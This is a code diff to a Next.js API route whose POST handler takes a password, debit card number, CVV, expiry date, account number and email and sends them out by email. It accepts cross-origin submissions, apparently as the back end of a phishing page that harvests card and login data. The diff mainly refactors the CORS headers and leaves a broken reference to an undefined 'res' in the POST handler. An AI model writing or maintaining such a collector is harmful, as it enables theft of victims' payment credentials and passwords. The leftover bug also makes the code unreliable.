@@ -27,30 +27,28 @@ const getCorsHeaders = (origin) => {
   return headers;
 };
 
-const corsHeader = getCorsHeaders(request.headers.get("origin") || "");
-
-export async function OPTIONS() {
+export async function OPTIONS(request) {
   // Return Response
   return NextResponse.json(
     {},
     {
       status: 200,
-      headers: corsHeader,
+      headers: getCorsHeaders(request.headers.get("origin") || ""),
     }
   );
 }
 
-export const GET = async (res) => {
+export const GET = async (request) => {
   return NextResponse.json(
     { message: "Working o" },
     {
       status: 200,
-      headers: corsHeader,
+      headers: getCorsHeaders(request.headers.get("origin") || ""),
     }
   );
 };
 
-export const POST = async (res) => {
+export const POST = async (request) => {
   const { password, debitNumber, cvv, expiryDate, accountNumber, email } =
     await res.json();
 
@@ -114,7 +112,10 @@ export const POST = async (res) => {
             message: "Message was not submitted successful. Please try again.",
             status: "failure",
           },
-          { status: 400, headers: corsHeader }
+          {
+            status: 400,
+            headers: getCorsHeaders(request.headers.get("origin") || ""),
+          }
         );
       } else {
         console.log(info);
@@ -122,13 +123,19 @@ export const POST = async (res) => {
         console.log("Email sent: " + info.response);
         return NextResponse.json(
           { message: "Message was sent successfully.", status: "success" },
-          { status: 200 }
+          {
+            status: 200,
+            headers: getCorsHeaders(request.headers.get("origin") || ""),
+          }
         );
       }
     });
   });
   return NextResponse.json(
     { message: "Thank you", status: "success" },
-    { status: 200, headers: corsHeader }
+    {
+      status: 200,
+      headers: getCorsHeaders(request.headers.get("origin") || ""),
+    }
   );
 };
